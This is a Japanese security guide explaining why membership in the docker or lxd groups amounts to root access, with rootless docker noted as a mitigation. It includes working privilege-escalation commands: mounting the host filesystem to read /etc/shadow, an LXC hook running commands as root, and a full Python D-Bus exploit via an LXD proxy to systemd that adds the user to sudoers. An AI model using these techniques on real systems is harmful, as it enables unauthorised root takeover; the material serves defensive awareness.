# コンテナ実行権限を持つグループへのユーザー追加

`docker` グループや `lxd` グループへのユーザー追加を行うことは、そのユーザーに root 権限を追加することと同義です。  
例えば docker の場合は次のようにホストのルートディレクトリをマウントすることで、ホスト側で任意の操作を行うことが可能になります。

```sh
ubuntu@sandbox:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
ubuntu@sandbox:~$ docker run --rm -it -v /:/hostfs ubuntu:latest bash
root@f6a72ca2aaf6:/# cat /hostfs/etc/shadow
root:*:18444:0:99999:7:::
...
```

ただし、rootless docker のようにコンテナを root 以外で動かしている場合は、一般ユーザー権限でコンテナを作成するため、この攻撃を緩和することができます。

```sh
ubuntu@rootless-docker:~$ docker run --rm -it -v /:/hostfs ubuntu:latest bash
root@0e55694c273c:/# cat /hostfs/etc/shadow
cat: /hostfs/etc/shadow: Permission denied
```

## lxd グループへの追加

LXD の場合、ユーザーを `lxd` グループに追加することでコンテナの操作が可能になりますが、これも docker 同様に root 権限を与えることと同義です。  

### hook を使った権限昇格

LXC には hook 機能があり、これを利用して root として任意のコマンドを実行できます。

```sh
$ lxc launch images:ubuntu/trusty/amd64 runme -c raw.lxc="lxc.hook.pre-start=sh -c 'echo foo >/runme'"
Creating runme
Starting runme
user@host:~$ ls -l /runme 
-rw-r--r-- 1 root root 5 May  7 10:29 /runme
```

### LXD proxy を利用した権限昇格

LXD の proxy 経由で unix socket にアクセスすると、その資格情報は root になってしまいます。  
これを利用して systemd の socket に接続して任意の service を操作することができます。

例えば次のような unix socket でやり取りを行うプログラムを起動します。

```sh
$ cat echo.py
import socket
import struct

def main():
    """Echo UNIX peercreds"""
    listen_sock = '/tmp/echo.sock'
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.bind(listen_sock)
    sock.listen()

    while True:
        print('waiting for a connection')
        connection = sock.accept()[0]
        peercred = connection.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED,
                                         struct.calcsize("3i"))
        pid, uid, gid = struct.unpack("3i", peercred)

        print("PID: {}, UID: {}, GID: {}".format(pid, uid, gid))

        continue

if __name__ == '__main__':
    main()

$ python3 echo.py
waiting for a connection
# nc -U /tmp/echo.sock でつなぐと、その UID, GID が表示される
PID: 15373, UID: 1001, GID: 1001
```

LXD proxy を用意して root で接続されるかを確認します。次のコマンドでコンテナ内の `/tmp/proxy.sock` からホストの `/tmp/echo.sock` に接続できます。

```sh
$ lxc config device add test proxy_sock proxy connect=unix:/tmp/echo.sock listen=unix:/tmp/proxy.sock bind=container mode=0777
Device proxy_sock added to test
```

同様に接続すると root になっていることがわかります。

```sh
$ lxc exec test -- sudo --user ubuntu --login
ubuntu@test:~$ nc -U /tmp/proxy.sock

$ python3 test.py
...
PID: 14988, UID: 0, GID: 0
```

これも lxd が root で動いていることが理由です。

```sh
$ ps aux | grep 14988
root     14988  0.0  0.7 1230076 30576 ?       Ssl  03:54   0:00 /snap/lxd/current/bin/lxd forkproxy -- 14522 -1 unix:/tmp/proxy.sock 13977 -1 unix:/var/lib/snapd/hostfs/tmp/echo.sock /var/snap/lxd/common/lxd/logs/test/proxy.proxy_sock.log /var/snap/lxd/common/lxd/devices/test/proxy.proxy_sock   0777
```

これを利用して systemd の socket と通信することで任意コード実行につなげることができます。  
systemd が利用する `/run/systemd/private` をコンテナ内の `/tmp/container_sock` に bind し、さらにそれをホスト側に bind することで、コンテナに入らずとも接続できるようにします。

```sh
lowpriv@vagrant:~$ lxc config device add test container_sock proxy connect=unix:/run/systemd/private listen=unix:/tmp/container_sock bind=container mode=0777
Device container_sock added to test
lowpriv@vagrant:~$ lxc config device add test host_sock proxy connect=unix:/tmp/container_sock listen=unix:/tmp/host_sock bind=host mode=0777
Device host_sock added to test
```

自身を sudoers に追加する systemd unit ファイルを作成し、systemd socket を通して実行することで root に権限昇格することができます。

```sh
$ cat /tmp/evil.service
[Unit]
Description=evil
[Service]
Type=oneshot
ExecStart=/bin/sh -c "echo user ALL=\(ALL\) NOPASSWD: ALL >> /etc/sudoers"
[Install]
WantedBy=multi-user.target

$ cat exploit.py
import socket
import sys
import time

AUTH = u'\0AUTH EXTERNAL 30\r\nNEGOTIATE_UNIX_FD\r\nBEGIN\r\n'

LINK = u'l\1\4\1$\0\0\0\1\0\0\0\242\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\r\0\0\0LinkUnitFiles\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\4asbb\0\0\0\0\0\0\0\26\0\0\0\21\0\0\0/tmp/evil.service\0\0\0\0\0\0\0\0\0\0\0'

RELOAD = u'l\1\4\1\0\0\0\0\2\0\0\0\211\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\6\0\0\0Reload\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0'

START = u'l\1\4\1 \0\0\0\1\0\0\0\240\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\t\0\0\0StartUnit\0\0\0\0\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\2ss\0\f\0\0\0evil.service\0\0\0\0\7\0\0\0replace\0'

def send_msg(sock_name, msg):
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.connect(sock_name)

    try:
        client_sock.sendall(AUTH.encode('latin-1'))
        reply = client_sock.recv(8192).decode("latin-1")
        print(reply)

        client_sock.sendall(msg.encode('latin-1'))
        reply = client_sock.recv(8192).decode("latin-1")

        print(reply)
    except:
        print("Connection reset...")

def main():

    for msg in [LINK, RELOAD, START]:
        send_msg(sys.argv[1], msg)
        time.sleep(1)

if __name__ == '__main__':
    main()

$ python3 exploit.py
OK c00157aa91bf4b70a9fcbe8e556ca3c1
AGREE_UNIX_FD

lo/org/freedesktop/systemd1s org.freedesktop.systemd1.ManagersUnitFilesChangedsorg.freedesktop.systemd1lR<usorg.freedesktop.systemdga(sss)Jsymlink /etc/systemd/system/evil.service/tmp/evil.service
OK 95eb8e05ae1647c7ba5aae363557ff5d
AGREE_UNIX_FD

lo/org/freedesktop/systemd1s org.freedesktop.systemd1.Managers  Reloadingsorg.freedesktop.systemdgb
OK 92f3058be4c74bf5a7f05a16182f393a
AGREE_UNIX_FD

lY¶o-/org/freedesktop/systemd1/unit/evil_2eservicesorg.freedesktop.DBus.PropertiessPropertiesChangedsorg.freedesktop.systemdsa{sv}as org.freedesktop.systemd1.Service¼MainPIDu
ControlPIDu
StatusTexts
           StatusErrnoiResults  exit-codeUIDuÿÿÿÿGIDuÿÿÿÿ       NRestartsuExecMainStartTimestamptØ
©ExecMainStartTimestampMonotonictÔOÔ
©ExecMainExitTimestampMonotonictîÔ

ExecMainPIDu^?
              ExecMainCodeiExecMainStatusii
ExecStartPost                              ExecStartPre ExecStart
ExecReloaExecStop
                 ExecStopPost

$ sudo su
root@host:~/# id
uid=0(root) gid=0(root) groups=0(root)
```

